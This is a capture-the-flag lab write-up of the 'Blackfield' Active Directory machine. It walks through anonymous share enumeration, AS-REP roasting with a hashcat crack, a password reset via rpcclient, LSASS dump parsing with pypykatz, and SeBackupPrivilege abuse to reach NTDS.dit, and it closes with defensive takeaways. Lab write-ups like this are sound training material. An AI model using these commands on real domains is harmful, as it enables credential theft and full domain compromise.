# Blackfield (Hard)

AS-REP roasting into a password-reset right over RPC, SMB share access to a forensic LSASS dump, and `SeBackupPrivilege` abuse for a full domain compromise.

## Enumeration

```bash
nmap -sC -sV -Pn -oA nmap <target>
```

```
53/tcp   open domain
135/tcp  open msrpc
389/tcp  open ldap          (Domain: BLACKFIELD.local)
445/tcp  open microsoft-ds?
593/tcp  open ncacn_http
3268/tcp open ldap
```

```bash
crackmapexec smb <target>
smbclient //<target>/profiles$
```

The `profiles$` share was listable anonymously and gave a full domain user list (no credentials required).

## Foothold — AS-REP roasting

```bash
GetNPUsers.py blackfield.local/ -usersfile users.txt -dc-ip <target> -no-pass -format hashcat
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked one account's password (redacted — `<REDACTED>`).

## Password reset via RPC → forensic share access

```bash
bloodhound-python -d blackfield.local -u <cracked_user> -p '<REDACTED>' -ns <target> -c all
```

BloodHound showed the cracked account has rights to **reset the password** of a second, otherwise-inaccessible account via RPC:

```bash
rpcclient -U blackfield/<cracked_user> <target>
rpcclient $> setuserinfo2 <target_account> 23 '<NEW_PASSWORD>'
```

With the reset password, a share was mounted:

```bash
sudo mount -t cifs -o 'username=<target_account>,password=<REDACTED>' //<target>/ /mnt
```

A `memory_analysis` directory contained `lsass.zip` — an LSASS process memory dump, likely left over from a "forensics" training exercise on this box.

```bash
cp lsass.zip ~/htb/hard/blackfield
pypykatz lsa minidump lsass.DMP
```

This yielded a service account's NTLM hash and cleartext credential material (redacted), used for a WinRM shell and `user.txt`.

## Privilege Escalation — `SeBackupPrivilege` abuse

```powershell
whoami /priv
```

The service account held **`SeBackupPrivilege`**, which allows reading any file on the filesystem (bypassing ACLs) regardless of other permissions — including the `NTDS.dit` Active Directory database and the `SYSTEM` registry hive needed to decrypt it. This is a well-known path to a full offline domain compromise (dump every account's password hash, including Administrator, without ever needing a live DCSync).

## Takeaways

- An anonymously-readable `profiles$`/`netlogon` share is often enough on its own to build a full username list.
- Any right that lets a low-privileged account reset another account's password (directly via RPC, or via a delegated ACE) is a privilege-escalation path on its own — map these with BloodHound.
- `SeBackupPrivilege` (and its counterpart `SeRestorePrivilege`) effectively grants read/write access to every file on the host, including `NTDS.dit` — treat accounts with it as Domain Admin equivalent.
